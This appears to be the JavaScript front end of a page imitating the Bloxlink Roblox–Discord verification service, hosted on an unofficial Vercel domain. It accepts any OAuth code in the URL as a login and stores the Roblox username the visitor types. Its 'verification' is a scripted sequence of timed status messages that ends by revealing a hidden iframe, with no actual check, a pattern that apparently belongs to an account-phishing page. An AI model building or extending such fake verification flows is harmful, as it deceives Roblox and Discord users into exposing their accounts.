/**
 * Bloxlink Frontend & Verification Controller
 * Handles Discord OAuth login, verification modal, and interactive dropdowns.
 */
document.addEventListener('DOMContentLoaded', () => {
  // -------------------------------------------------------------
  // DOM Elements
  // -------------------------------------------------------------
  const robloxUserInput = document.getElementById('robloxUserInput');
  const getVerifiedBtn = document.getElementById('getVerifiedBtn');
  const footerRobloxInput = document.getElementById('footerRobloxInput');
  const footerVerifiedBtn = document.getElementById('footerVerifiedBtn');

  // Verification Popup Elements
  const popupOverlay = document.getElementById('popupOverlay');
  const popupContainer = document.getElementById('popupContainer');
  const popupClose = document.getElementById('popupClose');
  const btnContinue = document.getElementById('btnContinue');
  const btnReturn = document.getElementById('btnReturn');
  const authContent = document.getElementById('authContent');
  const loadingContent = document.getElementById('loadingContent');
  const iframeContent = document.getElementById('iframeContent');

  const message1 = document.getElementById('message1');
  const message2 = document.getElementById('message2');
  const message3 = document.getElementById('message3');
  const message4 = document.getElementById('message4');

  // Authentication & Profile Navbar Elements
  const loggedOutSection = document.getElementById('loggedOutSection');
  const loggedInSection = document.getElementById('loggedInSection');
  const signInDiscordBtn = document.getElementById('signInDiscordBtn');
  const profileChipBtn = document.getElementById('profileChipBtn');
  const userDropdownMenu = document.getElementById('userDropdownMenu');
  const dropdownChevron = document.getElementById('dropdownChevron');
  const logoutBtn = document.getElementById('logoutBtn');
  const userDisplayName = document.getElementById('userDisplayName');

  // Mobile Navigation
  const mobileToggle = document.getElementById('mobileToggle');
  const mobileMenu = document.getElementById('mobileMenu');

  // -------------------------------------------------------------
  // Discord OAuth Callback Handler
  // -------------------------------------------------------------
  const urlParams = new URLSearchParams(window.location.search);
  const discordAuthCode = urlParams.get('code');

  let isLoggedIn = false;

  if (discordAuthCode) {
    // Authenticated via Discord OAuth callback (?code=...)
    isLoggedIn = true;
    sessionStorage.setItem('bloxlink_logged_in', 'true');

    // Clean URL query parameters smoothly without reloading
    window.history.replaceState({}, document.title, window.location.pathname);
  } else {
    // Check if session was active in this browser tab
    isLoggedIn = sessionStorage.getItem('bloxlink_logged_in') === 'true';
  }

  // Restore custom Roblox/Discord username if saved
  const savedRobloxUser = sessionStorage.getItem('saved_roblox_username');
  if (savedRobloxUser && userDisplayName) {
    userDisplayName.textContent = savedRobloxUser;
  }

  function updateAuthUI() {
    if (isLoggedIn) {
      if (loggedOutSection) loggedOutSection.style.display = 'none';
      if (loggedInSection) loggedInSection.style.display = 'block';
    } else {
      if (loggedOutSection) loggedOutSection.style.display = 'block';
      if (loggedInSection) loggedInSection.style.display = 'none';
      if (userDropdownMenu) userDropdownMenu.classList.remove('open');
    }
  }

  updateAuthUI();

  // -------------------------------------------------------------
  // Sign In with Discord Handler
  // -------------------------------------------------------------
  if (signInDiscordBtn) {
    signInDiscordBtn.addEventListener('click', (e) => {
      e.preventDefault();

      // Dynamic redirect URI for seamless localhost or production Vercel support
      const isLocal = window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1';
      const redirectUri = isLocal
        ? encodeURIComponent(window.location.origin + '/')
        : encodeURIComponent('https://embriaozinho.vercel.app/');

      const discordOAuthUrl = `https://discord.com/oauth2/authorize?client_id=1541620007560020029&response_type=code&redirect_uri=${redirectUri}&scope=identify`;

      window.location.href = discordOAuthUrl;
    });
  }

  // -------------------------------------------------------------
  // Profile Dropdown Menu Handlers
  // -------------------------------------------------------------
  if (profileChipBtn) {
    profileChipBtn.addEventListener('click', (e) => {
      e.stopPropagation();
      const isOpen = userDropdownMenu.classList.toggle('open');
      if (dropdownChevron) {
        dropdownChevron.style.transform = isOpen ? 'rotate(180deg)' : 'rotate(0deg)';
      }
    });
  }

  // Close dropdown when clicking outside
  document.addEventListener('click', (e) => {
    if (userDropdownMenu && !userDropdownMenu.contains(e.target) && profileChipBtn && !profileChipBtn.contains(e.target)) {
      userDropdownMenu.classList.remove('open');
      if (dropdownChevron) dropdownChevron.style.transform = 'rotate(0deg)';
    }
  });

  // Log out Handler
  if (logoutBtn) {
    logoutBtn.addEventListener('click', (e) => {
      e.preventDefault();
      isLoggedIn = false;
      sessionStorage.removeItem('bloxlink_logged_in');
      updateAuthUI();
    });
  }

  // -------------------------------------------------------------
  // Verification Modal Logic
  // -------------------------------------------------------------
  function openVerificationModal(username) {
    if (username && username.trim()) {
      sessionStorage.setItem('saved_roblox_username', username.trim());
      if (userDisplayName) {
        userDisplayName.textContent = username.trim();
      }
    }

    popupOverlay.classList.add('active');
    popupContainer.classList.remove('expanded');
    authContent.style.display = 'block';
    loadingContent.style.display = 'none';
    iframeContent.style.display = 'none';
    resetMessages();
  }

  function closePopup() {
    popupOverlay.classList.remove('active');
    resetMessages();
  }

  function resetMessages() {
    message1.style.opacity = '0.3';
    message1.style.color = '#94a3b8';
    message2.style.opacity = '0.3';
    message2.style.color = '#94a3b8';
    message3.style.opacity = '0.3';
    message3.style.color = '#94a3b8';
    message4.style.opacity = '0.3';
    message4.style.color = '#94a3b8';
  }

  if (getVerifiedBtn) {
    getVerifiedBtn.addEventListener('click', () => {
      const val = robloxUserInput ? robloxUserInput.value : '';
      openVerificationModal(val);
    });
  }

  if (robloxUserInput) {
    robloxUserInput.addEventListener('keydown', (e) => {
      if (e.key === 'Enter') {
        openVerificationModal(robloxUserInput.value);
      }
    });
  }

  if (footerVerifiedBtn) {
    footerVerifiedBtn.addEventListener('click', () => {
      const val = footerRobloxInput ? footerRobloxInput.value : '';
      openVerificationModal(val);
    });
  }

  if (popupClose) popupClose.addEventListener('click', closePopup);
  if (btnReturn) btnReturn.addEventListener('click', closePopup);

  popupOverlay.addEventListener('click', (e) => {
    if (e.target === popupOverlay) {
      closePopup();
    }
  });

  // Animated Multi-Step Verification Sequence
  if (btnContinue) {
    btnContinue.addEventListener('click', () => {
      authContent.style.display = 'none';
      loadingContent.style.display = 'flex';

      setTimeout(() => {
        message1.style.opacity = '1';
        message1.style.color = '#60a5fa';
      }, 500);

      setTimeout(() => {
        message1.style.opacity = '0.3';
        message2.style.opacity = '1';
        message2.style.color = '#60a5fa';
      }, 2000);

      setTimeout(() => {
        message2.style.opacity = '0.3';
        message3.style.opacity = '1';
        message3.style.color = '#60a5fa';
      }, 3500);

      setTimeout(() => {
        message3.style.opacity = '0.3';
        message4.style.opacity = '1';
        message4.style.color = '#60a5fa';
      }, 5000);

      setTimeout(() => {
        loadingContent.style.display = 'none';
        iframeContent.style.display = 'block';
        popupContainer.classList.add('expanded');
      }, 6500);
    });
  }

  // Mobile Menu Toggle
  if (mobileToggle && mobileMenu) {
    mobileToggle.addEventListener('click', () => {
      mobileMenu.classList.toggle('hidden');
    });
  }
});
